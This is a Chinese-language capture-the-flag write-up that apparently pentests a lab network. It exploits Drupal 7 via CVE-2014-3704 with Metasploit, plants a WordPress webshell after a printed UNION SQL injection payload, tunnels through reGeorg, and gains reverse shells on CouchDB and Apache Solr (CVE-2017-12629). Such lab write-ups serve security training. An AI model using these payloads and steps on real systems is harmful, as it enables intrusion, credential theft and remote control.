## 常见flag的存放位置

*   网页源代码
    
*   后台首页、文章
    
*   各种配置文件中（例：网站配置文件、redis配置文件……）

## 渗透过程

### 外网机器1：drupal

1、打开其中一个外网机器的web页面，发现时drupal7，且有提示：**用CMS版本命名一切**

![](../Images/baee78556e1f6ffc551316ce3f8bf0b0.png)

2、所以版本自然是drupal7，也有可能还命名了一些别的东西

  

3、搜索drupal相关漏洞后，发现了CVE-2014-3704，drupal7的sql注入漏洞。这个漏洞可以直接修改后台的管理员密码，搜索到的exp中只有重置密码的功能并没有常见的SQL各种查询功能，因此我们应该知道数据库的表名。结合前面的提示，我们猜测，表前缀可能就是drupal7。

  

4、该漏洞在msf中有专门的漏洞利用模块，但该模块的攻击脚本中使用的是默认的表名和表前缀。我们要修改脚本中的表名**【vim /usr/share/metasploit-framework/modules/exploits/multi/http/drupal\_drupageddon.rb】**

![](../Images/7e0f17d774c95c1b52acfd8adcb2abb0.png)

5、修改完成后，【reload\_all】重新载入模块

![](../Images/a3e6e7740f1d4297b4825c2daabe10d8.png)

6、然后使用该模块进行攻击，可以看到成功弹回了meterpreter会话

  

**【use exploit/multi/http/drupal\_drupageddon】**

**【set rhost 192.168.12.202】**

**【run】**

![](../Images/dd70d793e571cba99f7626ccce8f99aa.png)

7、使用【shell】切换到终端，在当前目录下寻找flag，得到flag3

**【grep -rn "flag.{" ./】**

![](../Images/a90e9bd2f66e27e143d32ada68c0753f.png)

8、使用命令全盘搜索flag，发现/home/flag，得到flag2

**【find / -name *flag* -print】**

![](../Images/136bffe3a3c939800c2b9775ab2ed8ff.png)

  

9、查看外网机器1的IP地址

![](../Images/cff0db7285fe33f31fd0c79183baddf8.png)

至此，外网机器1渗透完毕

2、针对wordpress网站，可以直接使用wpscan进行扫描，使用--enumerate vp参数扫描易受攻击的插件。【wpscan -u 192.168.12.205 --enumerate vp】

3、发现一个SQL注入漏洞

```
<input type\="text" name\="tableId" value\="1 UNION SELECT 1,2,CONCAT(user\_login,char(58),user\_pass),4,5 FROM wp\_users WHERE ID=1"\>
<input type\="submit" name\=""\>
</form\>
</body\>
</html\>
```

  

6、打开并点击 提交查询 后，页面返回如下

![](../Images/708ab9990b933b6d62dc395f3cae98d1.png)

7、这是因为目前没有用户登陆。查看文章发现用户star，且存在弱口令star:star

![](../Images/1a05b55172c2fd401ed050224e50b272.png)

8、用star/star登陆后台wp-admin，然后再次打开1.html并查询

10、得到密码：P@ssw0rd。使用admin/P@ssw0rd登陆后台，在插件列表中发现只有hello Dolly插件可写，因此我们编辑该插件，在里面插入一句话

### 代理及内网扫描

1、在外网机器2中，上传tunnel.nosocket.php文件

![](../Images/fe078ad4b3932d481b5b11a155b2f6fe.png)

2、在web页面中访问tunnel.nosocket.php，出现Georg says, 'All seems fine'则成功。

![](../Images/407d05db5659fa110e7e8bc9fcf61e77.png)

  

3、使用reGorgSocksProxy.py脚本，开启监听

**【 python2 reGeorgSocksProxy.py -u http://192.168.12.205/tunnel.php -l 0.0.0.0 -p 1080】**

![](../Images/ca3e6824efc7783daad6ed57788214dd.png)

4、修改proxychains的配置文件，让proxychains走1080端口代理

**【vim /etc/proxychains.conf】**

![](../Images/59e070c9f168ffff3dd764cb6f443ac5.png)

5、配置好后，使用代理扫描内网

**【proxychains nmap -Pn -sT 192.168.0.0/24 -p22,80,443,3306 -n】**

![](../Images/efbf13d4309638e72e93910b9d2108c0.png)

6、我们来整理一下扫描结果：192.168.0.1~192.168.0.6是存在的，而192.168.0.1是网关，192.168.0.3和192.168.0.4是外网机器。

内网机器：

192.168.0.2

192.168.0.5

192.168.0.6

由于这种扫描端口显示不全，分别对着三个机器进行端口扫描

**【proxychains nmap -Pn -sT 192.168.0.2 -p1-10000】**

![](../Images/25ce6d36123f6e98697f090b651aaafa.png)

**【proxychains nmap -Pn -sT 192.168.0.5 -p1-10000】**

![](../Images/2048586203cf3e71896171e52ff32fe3.png)

**【proxychains nmap -Pn -sT 192.168.0.6 -p1-10000】**

![](../Images/c50e283d8dc3abbd03e5a9294b8086e5.png)

### 内网机器1：couchdb

1、我们先来看IP为192.168.0.5的内网机器，从之前的扫描结果中，我们得知开启了22/4369/5984端口，其中5984端口是couchdb服务。

  

2、经过搜索，得知couchdb存在命令执行漏洞，可以拿到shell。已给出漏洞利用脚本couchdb\_exp.sh

![](../Images/65476f9ff2122e60f90f165e37bd5e4e.png)

3、先在本地监听8888端口，然后使用proxychains代理工具执行exp

**【nc -lvnp 8888】**

**【proxychains ./couchdb\_exp.sh】**

![](../Images/cb0e172164c830ac30c3922700988b1c.png)

4、再查看监听的8888端口，已拿到shell

![](../Images/f4a5aaf3e4e0327affd7727e9f8605ce.png)

5、接下来就是查看常见位置/home/flag，得到flag4

![](../Images/8c23b0225e60c432f56ddf1fe18b41e0.png)

6、在当前目录下搜索flag关键字，得到flag5

![](../Images/5d605128eb15386d5d19cd32dca5e574.png)

7、至此，内网机器1渗透完毕

### 内网机器2：apache solr

1、我们来看IP为192.168.0.6的内网机器，从前面的扫描结果中，我们知道开放的端口有22/8983/9983。而8983和9983运行着未知服务，使用nmap进行下服务识别

**【proxychains nmap -sT -Pn 192.168.0.6 -p8983 -sV】**

![](../Images/7912309b3a323f313b3e5f0643e6d9d2.png)

2、网上搜索后得知ApacheSolr服务存在CVE-2017-12629 RCE漏洞

  

3、利用过程如下：

使用proxychains启动浏览器**【proxychains firefox】**，直接访问如下网址：http://192.168.0.6:8983/solr/admin/collections?action=CREATE&name=new6&numShards=1，直接创造名为new6的collection

![](../Images/22dc6d9cae3c216d2ecf3efb14842c78.png)

4、创建完成之后，返回首页192.168.0.6:8983/solr/，点开下拉框，可以看到new6的字样

![](../Images/50181610abe41f1712461f396a71f6ae.png)

5、这里提供了漏洞利用脚本solr\_exp.sh

![](../Images/e28ad376bbfb196ea1cde66d1aa933da.png)

6、在本地监听7777端口，并执行exp脚本

**【nc -lvnp 7777】**

![](../Images/6a81012e8cedbcd7484ef63299721b85.png)

**【proxychains ./solr\_exp.sh】**

![](../Images/fed65b32d16928acaea5b812db6419ff.png)

7、再回到监听中的7777端口，已拿到shell（若失败，可多次执行脚本）

![](../Images/ac6f36fd0a0d99853ad72de37ecaecd7.png)

8、全盘搜索flag，发现两处，得到flag1和flag8

**【find / -name "flag" -print】**

![](../Images/5a3147f08afefb4d1db92abc11b5cef4.png)

**【cat /home/flag】**

![](../Images/1f6d3633911980b5f146ecaaa2984f33.png)

**【cat /opt/solr-7.0.1/flag】**

![](../Images/9ef2cc1b892acf746fedb49ea5f898fc.png)

至此，内网机器2渗透完毕
